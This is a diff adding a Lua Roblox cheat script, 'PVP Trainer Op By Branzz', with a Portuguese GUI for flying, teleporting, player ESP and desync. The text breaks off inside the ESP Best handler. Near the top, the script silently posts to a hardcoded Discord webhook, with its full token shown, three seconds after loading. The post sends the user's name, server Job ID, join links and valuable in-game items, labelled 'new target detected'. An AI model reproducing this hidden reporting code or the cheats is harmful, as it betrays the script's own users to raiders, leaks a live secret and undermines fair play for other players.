@@ -1,0 +1,1114 @@
+-- PVP Trainer Op By Branzz - VERSÃO FINAL
+-- Script completo com Desync + ESP Best + Webhook
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Variáveis de estado
+local markedPosition = nil
+local flyingEnabled = false
+local flyConnection = nil
+local espEnabled = false
+local espObjects = {}
+local desyncEnabled = false
+local platformConnection = nil
+local currentPlatform = nil
+local espBestEnabled = false
+
+-- Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1452048229746081892/L0qlArO_29VGJPDd2CRyZCeAT2qApQDZB__REic-GFi6tUsVOdZwetgtEoo9tZPJamQR"
+
+-- Lista de Brainrots válidos
+local VALID_BRAINROTS = {
+    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
+    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
+    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
+    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
+    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
+    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
+    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
+    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
+    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur"
+}
+
+-- ========== ANTI-RAGDOLL E PROTEÇÕES AUTOMÁTICAS ==========
+local function setupAntiRagdoll()
+    if character and character:FindFirstChild("Humanoid") then
+        local hum = character.Humanoid
+        
+        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+        
+        game:GetService("RunService").Stepped:Connect(function()
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                local hrp = character.HumanoidRootPart
+                
+                if hrp.AssemblyLinearVelocity.Magnitude > 150 then
+                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                end
+                
+                if hrp.Velocity.Magnitude > 100 then
+                    hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
+                end
+            end
+        end)
+        
+        print("✅ Anti-Ragdoll ativado!")
+    end
+end
+
+setupAntiRagdoll()
+
+-- ========== FUNÇÃO PARSE MONEY ==========
+local function parseMoneyPerSec(text)
+    if not text then return 0 end
+    local mult = 1
+    local numberStr = text:match("[%d%.]+")
+    if not numberStr then return 0 end
+    if text:find("K") then mult = 1000
+    elseif text:find("M") then mult = 1000000
+    elseif text:find("B") then mult = 1000000000
+    elseif text:find("T") then mult = 1000000000000
+    elseif text:find("Q") then mult = 1000000000000000 end
+    return tonumber(numberStr) * mult
+end
+
+-- ========== FUNÇÃO DETECTAR BRAINROTS ==========
+local function findBrainrots()
+    local foundBrainrots = {}
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    
+    if plotsFolder then
+        for _, plot in ipairs(plotsFolder:GetDescendants()) do
+            if plot:IsA("Model") then
+                for _, brainrot in ipairs(VALID_BRAINROTS) do
+                    if plot.Name == brainrot then
+                        table.insert(foundBrainrots, plot.Name)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Detectar money generation
+    local valorizado = false
+    for _, brainrote in getgenv and getgenv().base and getgenv().base:GetDescendants() or {} do
+        if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
+            if parseMoneyPerSec(brainrote.ContentText) > 49999999 then
+                valorizado = true
+                local nome = brainrote.Parent.DisplayName and brainrote.Parent.DisplayName.ContentText or "Unknown"
+                table.insert(foundBrainrots, nome .. " ($" .. brainrote.ContentText .. ")")
+            end
+        end
+    end
+    
+    return foundBrainrots, valorizado
+end
+
+-- ========== ENVIAR WEBHOOK ==========
+local function sendWebhook(brainrots)
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local playerName = player.Name
+    local playerCount = #Players:GetPlayers()
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    
+    -- Link para entrar no servidor
+    local joinLinkPC = "Roblox.GameLauncher.joinGameInstance(" .. placeId .. ", '" .. jobId .. "')"
+    local joinLinkMobile = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+    
+    local brainrotsList = ""
+    if #brainrots > 0 then
+        for i, brainrot in ipairs(brainrots) do
+            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
+            if i >= 30 then
+                brainrotsList = brainrotsList .. "... e mais\n"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+    
+    local payload = {
+        content = "@everyone NOVO ALVO DETECTADO! @everyone",
+        embeds = {{
+            title = "🧠 DETECÇÃO DE BRAINROTS 🧠",
+            color = 0xFF00FF,
+            fields = {
+                {
+                    name = "⏛ Data e Hora:",
+                    value = currentTime,
+                    inline = false
+                },
+                {
+                    name = "👤 Usuário:",
+                    value = playerName,
+                    inline = true
+                },
+                {
+                    name = "👥 Players no Servidor:",
+                    value = tostring(playerCount),
+                    inline = true
+                },
+                {
+                    name = "🆔 Job ID:",
+                    value = "```" .. jobId .. "```",
+                    inline = false
+                },
+                {
+                    name = "💻 Para PC:",
+                    value = "```lua\n" .. joinLinkPC .. "\n```",
+                    inline = false
+                },
+                {
+                    name = "📱 Para Celular:",
+                    value = "[Clique Aqui para Entrar](" .. joinLinkMobile .. ")",
+                    inline = false
+                },
+                {
+                    name = "🎒🧠 BRAINROTS DETECTADOS:",
+                    value = brainrotsList,
+                    inline = false
+                }
+            },
+            author = {
+                name = "Notificador🧠 || By: Project BRANZz"
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }},
+        components = {{
+            type = 1,
+            components = {{
+                type = 2,
+                style = 5,
+                label = "🎮 Entrar no Servidor",
+                url = joinLinkMobile
+            }}
+        }}
+    }
+    
+    pcall(function()
+        HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        print("✅ Webhook enviado!")
+    end)
+end
+
+-- Enviar webhook ao carregar
+spawn(function()
+    wait(3)
+    local brainrots = findBrainrots()
+    sendWebhook(brainrots)
+end)
+
+-- Criar ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PVPTrainerGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Frame Principal
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 320, 0, 400)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -200)
+mainFrame.BackgroundColor3 = Color3.fromRGB(45, 25, 75)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local mainBorder = Instance.new("UIStroke")
+mainBorder.Color = Color3.fromRGB(138, 43, 226)
+mainBorder.Thickness = 3
+mainBorder.Parent = mainFrame
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+-- Frame do Título
+local titleFrame = Instance.new("Frame")
+titleFrame.Name = "TitleFrame"
+titleFrame.Size = UDim2.new(1, 0, 0, 50)
+titleFrame.BackgroundColor3 = Color3.fromRGB(75, 35, 130)
+titleFrame.BorderSizePixel = 0
+titleFrame.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = titleFrame
+
+-- Título
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -100, 1, 0)
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "🎮 PVP Trainer Op"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 16
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleFrame
+
+local titleLabel2 = Instance.new("TextLabel")
+titleLabel2.Size = UDim2.new(1, -100, 1, 0)
+titleLabel2.Position = UDim2.new(0, 10, 0, 0)
+titleLabel2.BackgroundTransparency = 1
+titleLabel2.Text = "By Branzz"
+titleLabel2.TextColor3 = Color3.fromRGB(200, 150, 255)
+titleLabel2.TextSize = 11
+titleLabel2.Font = Enum.Font.Gotham
+titleLabel2.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel2.TextYAlignment = Enum.TextYAlignment.Bottom
+titleLabel2.Parent = titleFrame
+
+-- Botão Minimizar
+local minimizeBtn = Instance.new("TextButton")
+minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
+minimizeBtn.Position = UDim2.new(1, -70, 0, 10)
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+minimizeBtn.Text = "−"
+minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeBtn.TextSize = 20
+minimizeBtn.Font = Enum.Font.GothamBold
+minimizeBtn.Parent = titleFrame
+
+local minCorner = Instance.new("UICorner")
+minCorner.CornerRadius = UDim.new(0, 8)
+minCorner.Parent = minimizeBtn
+
+-- Botão Fechar
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 10)
+closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+closeBtn.Text = "×"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextSize = 24
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.Parent = titleFrame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = closeBtn
+
+-- SCROLLING FRAME
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Size = UDim2.new(1, -20, 1, -70)
+scrollFrame.Position = UDim2.new(0, 10, 0, 60)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.ScrollBarThickness = 6
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(138, 43, 226)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 950)
+scrollFrame.Parent = mainFrame
+
+-- Função para criar botão
+local function createButton(name, text, position, parent)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Size = UDim2.new(1, -10, 0, 45)
+    btn.Position = position
+    btn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 14
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = parent
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = btn
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(138, 43, 226)
+    stroke.Thickness = 1.5
+    stroke.Parent = btn
+    
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(120, 70, 190)
+    end)
+    
+    btn.MouseLeave:Connect(function()
+        if not btn:FindFirstChild("Active") then
+            btn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        end
+    end)
+    
+    return btn
+end
+
+-- Função para criar seção
+local function createSection(title, position)
+    local section = Instance.new("Frame")
+    section.Size = UDim2.new(1, -10, 0, 30)
+    section.Position = position
+    section.BackgroundColor3 = Color3.fromRGB(60, 30, 100)
+    section.BorderSizePixel = 0
+    section.Parent = scrollFrame
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = section
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -10, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = title
+    label.TextColor3 = Color3.fromRGB(255, 200, 255)
+    label.TextSize = 14
+    label.Font = Enum.Font.GothamBold
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = section
+    
+    return section
+end
+
+-- ========== SEÇÕES DA GUI ==========
+createSection("📍 WAYPOINTS", UDim2.new(0, 5, 0, 5))
+local markBtn = createButton("MarkBtn", "📍 Mark Position", UDim2.new(0, 5, 0, 45), scrollFrame)
+local clearBtn = createButton("ClearBtn", "🗑️ Clear Position", UDim2.new(0, 5, 0, 100), scrollFrame)
+clearBtn.BackgroundColor3 = Color3.fromRGB(75, 45, 120)
+
+createSection("🦅 MOVIMENTO", UDim2.new(0, 5, 0, 160))
+local flyBtn = createButton("FlyBtn", "🦅 Vôo Livre: OFF", UDim2.new(0, 5, 0, 200), scrollFrame)
+
+local flyIndicator = Instance.new("Frame")
+flyIndicator.Size = UDim2.new(0, 15, 0, 15)
+flyIndicator.Position = UDim2.new(0, 8, 0.5, -7.5)
+flyIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+flyIndicator.BorderSizePixel = 0
+flyIndicator.Parent = flyBtn
+
+local flyIndCorner = Instance.new("UICorner")
+flyIndCorner.CornerRadius = UDim.new(1, 0)
+flyIndCorner.Parent = flyIndicator
+
+local tpBtn = createButton("TPBtn", "🌏 TP to Position", UDim2.new(0, 5, 0, 255), scrollFrame)
+
+createSection("👁️ ESP SYSTEM", UDim2.new(0, 5, 0, 315))
+local espBtn = createButton("ESPBtn", "👁️ ESP Players: OFF", UDim2.new(0, 5, 0, 355), scrollFrame)
+
+local espIndicator = Instance.new("Frame")
+espIndicator.Size = UDim2.new(0, 15, 0, 15)
+espIndicator.Position = UDim2.new(0, 8, 0.5, -7.5)
+espIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+espIndicator.BorderSizePixel = 0
+espIndicator.Parent = espBtn
+
+local espIndCorner = Instance.new("UICorner")
+espIndCorner.CornerRadius = UDim.new(1, 0)
+espIndCorner.Parent = espIndicator
+
+local espBestBtn = createButton("ESPBestBtn", "💎 ESP Best: OFF", UDim2.new(0, 5, 0, 410), scrollFrame)
+
+createSection("🌟 TELEPORT", UDim2.new(0, 5, 0, 470))
+local tpSpawnBtn = createButton("TPSpawn", "🏠 TP to Spawn", UDim2.new(0, 5, 0, 510), scrollFrame)
+tpSpawnBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 140)
+
+local tpRandomBtn = createButton("TPRandom", "🎲 TP Random Player", UDim2.new(0, 5, 0, 565), scrollFrame)
+tpRandomBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 140)
+
+createSection("✨ EFEITOS", UDim2.new(0, 5, 0, 625))
+local trailBtn = createButton("TrailBtn", "✨ Flight Trail: OFF", UDim2.new(0, 5, 0, 665), scrollFrame)
+
+createSection("🌀 DESYNC", UDim2.new(0, 5, 0, 725))
+local desyncBtn = createButton("DesyncBtn", "🌀 Desync: OFF", UDim2.new(0, 5, 0, 765), scrollFrame)
+
+local desyncIndicator = Instance.new("Frame")
+desyncIndicator.Size = UDim2.new(0, 15, 0, 15)
+desyncIndicator.Position = UDim2.new(0, 8, 0.5, -7.5)
+desyncIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+desyncIndicator.BorderSizePixel = 0
+desyncIndicator.Parent = desyncBtn
+
+local desyncIndCorner = Instance.new("UICorner")
+desyncIndCorner.CornerRadius = UDim.new(1, 0)
+desyncIndCorner.Parent = desyncIndicator
+
+local desyncInfo = Instance.new("TextLabel")
+desyncInfo.Size = UDim2.new(1, -10, 0, 60)
+desyncInfo.Position = UDim2.new(0, 5, 0, 820)
+desyncInfo.BackgroundColor3 = Color3.fromRGB(60, 30, 100)
+desyncInfo.Text = "ℹ️ Desync faz você aparecer em outro lugar para outros jogadores!"
+desyncInfo.TextColor3 = Color3.fromRGB(200, 200, 255)
+desyncInfo.TextSize = 11
+desyncInfo.Font = Enum.Font.Gotham
+desyncInfo.TextWrapped = true
+desyncInfo.TextYAlignment = Enum.TextYAlignment.Top
+desyncInfo.Parent = scrollFrame
+
+local desyncInfoCorner = Instance.new("UICorner")
+desyncInfoCorner.CornerRadius = UDim.new(0, 8)
+desyncInfoCorner.Parent = desyncInfo
+
+-- ========== MINIMIZAR/MAXIMIZAR ==========
+local isMinimized = false
+
+minimizeBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    
+    if isMinimized then
+        mainFrame:TweenSize(UDim2.new(0, 320, 0, 50), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
+        minimizeBtn.Text = "+"
+        scrollFrame.Visible = false
+    else
+        mainFrame:TweenSize(UDim2.new(0, 320, 0, 400), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
+        minimizeBtn.Text = "−"
+        scrollFrame.Visible = true
+    end
+end)
+
+-- ========== FECHAR ==========
+closeBtn.MouseButton1Click:Connect(function()
+    for _, espObj in pairs(espObjects) do
+        if espObj then espObj:Destroy() end
+    end
+    
+    if flyConnection then flyConnection:Disconnect() end
+    if platformConnection then platformConnection:Disconnect() end
+    if currentPlatform then currentPlatform:Destroy() end
+    
+    screenGui:Destroy()
+end)
+
+-- ========== MARK POSITION ==========
+markBtn.MouseButton1Click:Connect(function()
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        markedPosition = character.HumanoidRootPart.Position
+        markBtn.Text = "✅ Position Marked!"
+        markBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        
+        local marker = Instance.new("Part")
+        marker.Shape = Enum.PartType.Cylinder
+        marker.Size = Vector3.new(0.5, 5, 5)
+        marker.CFrame = CFrame.new(markedPosition) * CFrame.Angles(0, 0, math.rad(90))
+        marker.Anchored = true
+        marker.CanCollide = false
+        marker.Material = Enum.Material.Neon
+        marker.BrickColor = BrickColor.new("Bright violet")
+        marker.Transparency = 0.3
+        marker.Parent = workspace
+        
+        game:GetService("Debris"):AddItem(marker, 3)
+        
+        wait(2)
+        markBtn.Text = "📍 Mark Position"
+        markBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+    end
+end)
+
+-- ========== CLEAR POSITION ==========
+clearBtn.MouseButton1Click:Connect(function()
+    markedPosition = nil
+    clearBtn.Text = "✅ Cleared!"
+    clearBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+    
+    wait(2)
+    clearBtn.Text = "🗑️ Clear Position"
+    clearBtn.BackgroundColor3 = Color3.fromRGB(75, 45, 120)
+end)
+
+-- ========== CRIAR PLATAFORMA ==========
+local function createFlightPlatform()
+    local platform = Instance.new("Part")
+    platform.Name = "FlightPlatform"
+    platform.Size = Vector3.new(6, 0.5, 6)
+    platform.Anchored = true
+    platform.CanCollide = true
+    platform.Material = Enum.Material.Neon
+    platform.BrickColor = BrickColor.new("Bright violet")
+    platform.Transparency = 0.4
+    platform.Parent = workspace
+    
+    return platform
+end
+
+-- ========== VÔO LIVRE ==========
+flyBtn.MouseButton1Click:Connect(function()
+    flyingEnabled = not flyingEnabled
+    
+    if flyingEnabled then
+        flyBtn.Text = "🦅 Vôo Livre: ON"
+        flyBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        flyIndicator.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+        
+        local activeTag = Instance.new("BoolValue")
+        activeTag.Name = "Active"
+        activeTag.Parent = flyBtn
+        
+        local flightSpeed = 20
+        local lastPlatformTime = tick()
+        
+        if flyConnection then flyConnection:Disconnect() end
+        
+        flyConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if flyingEnabled and character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
+                local camera = workspace.CurrentCamera
+                local rootPart = character.HumanoidRootPart
+                local hum = character.Humanoid
+                
+                if camera and rootPart then
+                    local direction = camera.CFrame.LookVector
+                    rootPart.CFrame = rootPart.CFrame + (direction * flightSpeed * 0.016)
+                    rootPart.Velocity = Vector3.new(0, 0, 0)
+                    rootPart.RotVelocity = Vector3.new(0, 0, 0)
+                    
+                    hum:ChangeState(Enum.HumanoidStateType.Physics)
+                    
+                    if tick() - lastPlatformTime >= 2 then
+                        local platform = createFlightPlatform()
+                        platform.Position = rootPart.Position - Vector3.new(0, 4, 0)
+                        game:GetService("Debris"):AddItem(platform, 8)
+                        lastPlatformTime = tick()
+                    end
+                end
+            end
+        end)
+    else
+        flyBtn.Text = "🦅 Vôo Livre: OFF"
+        flyBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        flyIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        if flyBtn:FindFirstChild("Active") then
+            flyBtn.Active:Destroy()
+        end
+        
+        if flyConnection then
+            flyConnection:Disconnect()
+            flyConnection = nil
+        end
+        
+        if character and character:FindFirstChild("Humanoid") then
+            character.Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+        end
+    end
+end)
+
+-- ========== TP POSITION ==========
+tpBtn.MouseButton1Click:Connect(function()
+    if not markedPosition then
+        tpBtn.Text = "⚠️ Nenhuma posição!"
+        tpBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        wait(2)
+        tpBtn.Text = "🌏 TP to Position"
+        tpBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        return
+    end
+    
+    if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
+        local rootPart = character.HumanoidRootPart
+        local hum = character.Humanoid
+        
+        tpBtn.Text = "✈️ Voando..."
+        tpBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+        
+        local wasFlying = flyingEnabled
+        if flyingEnabled then
+            flyingEnabled = false
+            if flyConnection then
+                flyConnection:Disconnect()
+                flyConnection = nil
+            end
+        end
+        
+        local tpSpeed = 20
+        local targetPos = markedPosition
+        local arrived = false
+        local lastPlatformTime = tick()
+        
+        local tpConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if character and rootPart and hum then
+                local currentPos = rootPart.Position
+                local direction = (targetPos - currentPos).Unit
+                local distance = (targetPos - currentPos).Magnitude
+                
+                if distance < 5 then
+                    arrived = true
+                    return
+                end
+                
+                rootPart.CFrame = rootPart.CFrame + (direction * tpSpeed * 0.016)
+                rootPart.Velocity = Vector3.new(0, 0, 0)
+                rootPart.RotVelocity = Vector3.new(0, 0, 0)
+                
+                hum:ChangeState(Enum.HumanoidStateType.Physics)
+                
+                if tick() - lastPlatformTime >= 2 then
+                    local platform = createFlightPlatform()
+                    platform.Position = rootPart.Position - Vector3.new(0, 4, 0)
+                    game:GetService("Debris"):AddItem(platform, 8)
+                    lastPlatformTime = tick()
+                end
+            end
+        end)
+        
+        while not arrived do
+            wait(0.1)
+        end
+        
+        tpConnection:Disconnect()
+        
+        if character and hum then
+            hum:ChangeState(Enum.HumanoidStateType.Freefall)
+        end
+        
+        tpBtn.Text = "✅ Chegou!"
+        tpBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        
+        wait(2)
+        tpBtn.Text = "🌏 TP to Position"
+        tpBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        
+        if wasFlying then
+            flyingEnabled = true
+            flyBtn.Text = "🦅 Vôo Livre: ON"
+            flyBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+            flyIndicator.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+            
+            local flightSpeed = 20
+            local lastPlatformTime2 = tick()
+            
+            flyConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                if flyingEnabled and character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
+                    local camera = workspace.CurrentCamera
+                    local rp = character.HumanoidRootPart
+                    local h = character.Humanoid
+                    
+                    if camera and rp then
+                        local direction = camera.CFrame.LookVector
+                        rp.CFrame = rp.CFrame + (direction * flightSpeed * 0.016)
+                        rp.Velocity = Vector3.new(0, 0, 0)
+                        rp.RotVelocity = Vector3.new(0, 0, 0)
+                        
+                        h:ChangeState(Enum.HumanoidStateType.Physics)
+                        
+                        if tick() - lastPlatformTime2 >= 2 then
+                            local platform = createFlightPlatform()
+                            platform.Position = rp.Position - Vector3.new(0, 4, 0)
+                            game:GetService("Debris"):AddItem(platform, 8)
+                            lastPlatformTime2 = tick()
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- ========== ESP PLAYERS MELHORADO ==========
+local function createESP(targetPlayer)
+    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return
+    end
+    
+    -- Highlight
+    local highlight = Instance.new("Highlight")
+    highlight.Name = "ESP_Highlight"
+    highlight.FillColor = Color3.fromRGB(138, 43, 226)
+    highlight.OutlineColor = Color3.fromRGB(255, 100, 255)
+    highlight.FillTransparency = 0.4
+    highlight.OutlineTransparency = 0
+    highlight.Parent = targetPlayer.Character
+    
+    -- Billboard
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ESP_Billboard"
+    billboard.Adornee = targetPlayer.Character.HumanoidRootPart
+    billboard.Size = UDim2.new(0, 200, 0, 80)
+    billboard.StudsOffset = Vector3.new(0, 4, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = targetPlayer.Character.HumanoidRootPart
+    
+    -- Frame com fundo
+    local bgFrame = Instance.new("Frame")
+    bgFrame.Size = UDim2.new(1, 0, 1, 0)
+    bgFrame.BackgroundColor3 = Color3.fromRGB(30, 15, 50)
+    bgFrame.BackgroundTransparency = 0.3
+    bgFrame.BorderSizePixel = 0
+    bgFrame.Parent = billboard
+    
+    local bgCorner = Instance.new("UICorner")
+    bgCorner.CornerRadius = UDim.new(0, 8)
+    bgCorner.Parent = bgFrame
+    
+    -- Nome
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(1, 0, 0.35, 0)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = "👤 " .. targetPlayer.Name
+    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameLabel.TextSize = 16
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.TextStrokeTransparency = 0.3
+    nameLabel.Parent = bgFrame
+    
+    -- Distância
+    local distLabel = Instance.new("TextLabel")
+    distLabel.Size = UDim2.new(1, 0, 0.3, 0)
+    distLabel.Position = UDim2.new(0, 0, 0.35, 0)
+    distLabel.BackgroundTransparency = 1
+    distLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    distLabel.TextSize = 14
+    distLabel.Font = Enum.Font.Gotham
+    distLabel.TextStrokeTransparency = 0.3
+    distLabel.Parent = bgFrame
+    
+    -- HP
+    local hpLabel = Instance.new("TextLabel")
+    hpLabel.Size = UDim2.new(1, 0, 0.35, 0)
+    hpLabel.Position = UDim2.new(0, 0, 0.65, 0)
+    hpLabel.BackgroundTransparency = 1
+    hpLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    hpLabel.TextSize = 14
+    hpLabel.Font = Enum.Font.Gotham
+    hpLabel.TextStrokeTransparency = 0.3
+    hpLabel.Parent = bgFrame
+    
+    table.insert(espObjects, highlight)
+    table.insert(espObjects, billboard)
+    
+    spawn(function()
+        while espEnabled and targetPlayer.Character and billboard.Parent do
+            pcall(function()
+                if character and character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    local dist = (character.HumanoidRootPart.Position - targetPlayer.Character.HumanoidRootPart.Position).Magnitude
+                    distLabel.Text = string.format("📏 %.1f studs", dist)
+                    
+                    if targetPlayer.Character:FindFirstChild("Humanoid") then
+                        local hp = targetPlayer.Character.Humanoid.Health
+                        local maxHp = targetPlayer.Character.Humanoid.MaxHealth
+                        hpLabel.Text = string.format("❤️ %.0f/%.0f HP", hp, maxHp)
+                    end
+                end
+            end)
+            wait(0.1)
+        end
+    end)
+end
+
+espBtn.MouseButton1Click:Connect(function()
+    espEnabled = not espEnabled
+    
+    if espEnabled then
+        espBtn.Text = "👁️ ESP Players: ON"
+        espBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        espIndicator.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+        
+        local activeTag = Instance.new("BoolValue")
+        activeTag.Name = "Active"
+        activeTag.Parent = espBtn
+        
+        for _, otherPlayer in pairs(Players:GetPlayers()) do
+            if otherPlayer ~= player then
+                createESP(otherPlayer)
+            end
+        end
+        
+        Players.PlayerAdded:Connect(function(newPlayer)
+            if espEnabled then
+                newPlayer.CharacterAdded:Connect(function()
+                    wait(1)
+                    if espEnabled then
+                        createESP(newPlayer)
+                    end
+                end)
+            end
+        end)
+    else
+        espBtn.Text = "👁️ ESP Players: OFF"
+        espBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        espIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        if espBtn:FindFirstChild("Active") then
+            espBtn.Active:Destroy()
+        end
+        
+        for _, espObj in pairs(espObjects) do
+            if espObj then espObj:Destroy() end
+        end
+        espObjects = {}
+    end
+end)
+
+-- ========== ESP BEST ==========
+espBestBtn.MouseButton1Click:Connect(function()
+    espBestEnabled = not espBestEnabled
+    
+    if espBestEnabled then
